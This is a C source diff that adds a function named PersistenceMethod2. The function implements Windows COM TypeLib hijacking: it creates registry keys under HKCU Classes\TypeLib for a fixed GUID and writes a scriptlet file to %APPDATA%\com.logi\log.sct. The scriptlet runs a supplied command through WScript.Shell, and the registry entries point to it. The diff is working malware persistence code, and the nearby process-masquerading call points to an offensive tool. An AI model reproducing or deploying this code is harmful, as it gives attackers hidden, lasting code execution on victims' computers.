@@ -229,3 +229,111 @@ CLEANUP:
 	MasqueradeProcessPath(NULL, TRUE, BackupPath);
 	return Result;
 }
+
+BOOL PersistenceMethod2
+(
+	_In_ LPSTR lpCommandLine
+)
+{
+	CHAR szTypeLibPath[] = "SOFTWARE\\Classes\\TypeLib\\{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}";
+	LSTATUS Status = ERROR_SUCCESS;
+	HKEY hKey = NULL;
+	HKEY hTypeLibHkey = NULL;
+	HKEY hWin64 = NULL;
+	HKEY hWin32 = NULL;
+	HKEY hZero = NULL;
+	BOOL Result = FALSE;
+	CHAR szTemplate[] = "<?xml version=\"1.0\"?>\n<scriptlet>\n    <Registration\n        description=\"For Fun\"\n        progid=\"FORFUN\"\n        version=\"1.0\"\n    </Registration>\n    <script language=\"JScript\">\n        <![CDATA[\n            var WShell = new ActiveXObject(\"WScript.Shell\");\n            WShell.Run(\"%s\");\n        ]]>\n    </script>\n</scriptlet>";
+	LPSTR lpSctContent = NULL;
+	LPSTR lpSctPath = NULL;
+	LPWSTR lpTempPath = NULL;
+
+	Status = RegOpenKeyExA(HKEY_CURRENT_USER, szTypeLibPath, 0, KEY_READ, &hKey);
+	if (Status != ERROR_PATH_NOT_FOUND && Status != ERROR_FILE_NOT_FOUND) {
+		LOG_ERROR("RegOpenKeyExA", Status);
+		goto CLEANUP;
+	}
+
+	Status = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Classes\\TypeLib", 0, KEY_WRITE, &hKey);
+	if (Status != ERROR_SUCCESS) {
+		LOG_ERROR("RegOpenKeyExA", Status);
+		goto CLEANUP;
+	}
+
+	Status = RegCreateKeyExA(hKey, "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}\\1.1\\0", 0, NULL, 0, KEY_WRITE, NULL, &hTypeLibHkey, NULL);
+	if (Status != ERROR_SUCCESS) {
+		LOG_ERROR("RegCreateKeyExA", Status);
+		goto CLEANUP;
+	}
+
+	Status = RegCreateKeyExA(hTypeLibHkey, "win64", 0, NULL, 0, KEY_WRITE, NULL, &hWin64, NULL);
+	if (Status != ERROR_SUCCESS) {
+		LOG_ERROR("RegCreateKeyExA", Status);
+		goto CLEANUP;
+	}
+
+	Status = RegCreateKeyExA(hTypeLibHkey, "win32", 0, NULL, 0, KEY_WRITE, NULL, &hWin32, NULL);
+	if (Status != ERROR_SUCCESS) {
+		LOG_ERROR("RegCreateKeyExA", Status);
+		goto CLEANUP;
+	}
+
+	lpSctPath = ALLOC(MAX_PATH);
+	ExpandEnvironmentStringsA("%APPDATA%\\com.logi", lpSctPath, MAX_PATH);
+	if (!CreateDirectoryA(lpSctPath, NULL)) {
+		LOG_ERROR("CreateDirectoryA", GetLastError());
+		goto CLEANUP;
+	}
+
+	lstrcatA(lpSctPath, "\\log.sct");
+	lpSctContent = ALLOC(lstrlenA(szTemplate) + lstrlenA(lpCommandLine));
+	wsprintfA(lpSctContent, szTemplate, lpCommandLine);
+	lpTempPath = ConvertCharToWchar(lpSctPath);
+	if (!WriteToFile(lpTempPath, lpSctContent, lstrlenA(lpSctContent))) {
+		goto CLEANUP;
+	}
+
+	Status = RegSetValueA(hWin64, NULL, REG_SZ, lpSctPath, lstrlenA(lpSctPath));
+	if (Status != ERROR_SUCCESS) {
+		LOG_ERROR("RegSetValueA", Status);
+		goto CLEANUP;
+	}
+
+	Status = RegSetValueA(hWin32, NULL, REG_SZ, lpSctPath, lstrlenA(lpSctPath));
+	if (Status != ERROR_SUCCESS) {
+		LOG_ERROR("RegSetValueA", Status);
+		goto CLEANUP;
+	}
+
+	Result = TRUE;
+CLEANUP:
+	if (hKey != NULL) {
+		RegCloseKey(hKey);
+	}
+
+	if (hTypeLibHkey != NULL) {
+		RegCloseKey(hTypeLibHkey);
+	}
+
+	if (hWin64 != NULL) {
+		RegCloseKey(hWin64);
+	}
+
+	if (hWin32 != NULL) {
+		RegCloseKey(hWin32);
+	}
+
+	if (lpSctPath != NULL) {
+		FREE(lpSctPath);
+	}
+
+	if (lpTempPath != NULL) {
+		FREE(lpTempPath);
+	}
+
+	if (lpSctContent != NULL) {
+		FREE(lpSctContent);
+	}
+
+	return Result;
+}
